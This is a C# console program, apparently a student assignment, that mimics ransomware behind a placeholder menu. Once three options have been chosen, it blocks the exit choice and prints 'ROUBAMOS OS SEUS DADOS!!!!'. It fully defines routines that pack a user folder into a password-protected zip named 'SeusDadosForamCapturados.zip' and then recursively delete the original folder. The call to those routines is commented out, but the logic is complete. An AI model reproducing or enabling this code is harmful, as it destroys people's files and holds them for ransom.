using ICSharpCode.SharpZipLib.Zip;
using System;
using System.IO;

class Program
{
    static void Main(string[] args)
    {
        int contadorChamadas = 0;
        while (true)
        {
            Console.WriteLine("Menu:");
            Console.WriteLine("1 - Opção 1");
            Console.WriteLine("2 - Opção 2");
            Console.WriteLine("3 - Opção 3");
            Console.WriteLine("4 - Sair");
            Console.Write("Escolha uma opção: ");
            string escolha = Console.ReadLine();

            switch (escolha)
            {
                case "1":
                    ExecutarOpcao1();
                    break;
                case "2":
                    ExecutarOpcao2();
                    break;
                case "3":
                    ExecutarOpcao3();
                    break;
                case "4":
                    if (contadorChamadas >= 3)
                    {
                        break;
                    }
                    else
                    {
                        Console.WriteLine("Saindo...");
                        return;
                    }
                default:
                    Console.WriteLine("Opção inválida.");
                    break;
            }

            // Incrementa o contador de chamadas
            contadorChamadas++;

            // Se o contador atingir 3, executa a compactação e zera o contador
            if (contadorChamadas >= 3)
            {
                Console.WriteLine("Executando a compactação da pasta...");
                Console.WriteLine("aqui vai dar merda");

                /*
                 
                  try
        {
            string pastaOrigem = "C:\\Users\\paulo\\Desktop\\POO-TrabalhoRamsonware";
            string arquivoDestino = "C:\\Users\\paulo\\Desktop\\SeusDadosForamCapturados.zip";
            string senha = "senhabemmassa";

            if (!Directory.Exists(pastaOrigem))
            {
                Console.WriteLine("A pasta informada não existe.");
                return;
            }

            // Compactar a pasta
            CompactarPastaComSenha(pastaOrigem, arquivoDestino, senha);

            // Verifica se o arquivo ZIP foi criado com sucesso
            if (File.Exists(arquivoDestino))
            {
                // Apagar a pasta original permanentemente
                ApagarPastaPermanentemente(pastaOrigem);
            }
            else
            {
                Console.WriteLine("O arquivo ZIP não foi criado corretamente. A pasta não será apagada.");
            }
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine($"Erro durante o processo: {ex}");
        }

                 
                 
                 */


                Console.WriteLine("-------------------------------------------------");
                Console.WriteLine("ROUBAMOS OS SEUS DADOS!!!!");
                Console.WriteLine("-------------------------------------------------");


                //  contadorChamadas = 0;

            }
        }




        static void ExecutarOpcao1()
        {
            Console.WriteLine("Opção 1 executada.");
            // Coloque a lógica específica da Opção 1 aqui
        }

        static void ExecutarOpcao2()
        {
            Console.WriteLine("Opção 2 executada.");
            // Coloque a lógica específica da Opção 2 aqui
        }

        static void ExecutarOpcao3()
        {
            Console.WriteLine("Opção 3 executada.");
            // Coloque a lógica específica da Opção 3 aqui
        }
    }

    static void CompactarPastaComSenha(string pastaOrigem, string arquivoDestino, string senha)
    {
        try
        {
            // Cria o arquivo ZIP
            using (FileStream fs = File.Create(arquivoDestino))
            using (ZipOutputStream zipStream = new ZipOutputStream(fs))
            {
                zipStream.SetLevel(9); // Define o nível de compressão (0-9)
                zipStream.Password = senha; // Define a senha

                // Adiciona os arquivos da pasta ao ZIP
                AdicionarPastaAoZip(zipStream, pastaOrigem, "");

                zipStream.Finish();
            }

            Console.WriteLine($"Pasta compactada com sucesso em {arquivoDestino}");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Erro ao compactar a pasta: {ex.Message}");
            throw;
        }
    }

    static void AdicionarPastaAoZip(ZipOutputStream zipStream, string pastaOrigem, string pastaRelativa)
    {
        // Adicionar todos os arquivos da pasta ao ZIP
        foreach (var arquivo in Directory.GetFiles(pastaOrigem))
        {
            var entryName = Path.Combine(pastaRelativa, Path.GetFileName(arquivo));
            var newEntry = new ZipEntry(entryName)
            {
                DateTime = DateTime.Now
            };

            zipStream.PutNextEntry(newEntry);

            // Escrever o conteúdo do arquivo no ZIP
            using (var fs = File.OpenRead(arquivo))
            {
                fs.CopyTo(zipStream);
            }

            zipStream.CloseEntry();
        }

        // Recursivamente adicionar subpastas
        foreach (var subPasta in Directory.GetDirectories(pastaOrigem))
        {
            var pastaNome = Path.Combine(pastaRelativa, Path.GetFileName(subPasta));
            AdicionarPastaAoZip(zipStream, subPasta, pastaNome);
        }
    }

    static void ApagarPastaPermanentemente(string pastaOrigem)
    {
        try
        {
            // Apaga a pasta de forma permanente
            Directory.Delete(pastaOrigem, true); // O segundo parâmetro 'true' indica que deve apagar subdiretórios e arquivos
            Console.WriteLine("Pasta original apagada permanentemente.");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Erro ao apagar a pasta: {ex.Message}");
            throw;
        }
    }
}
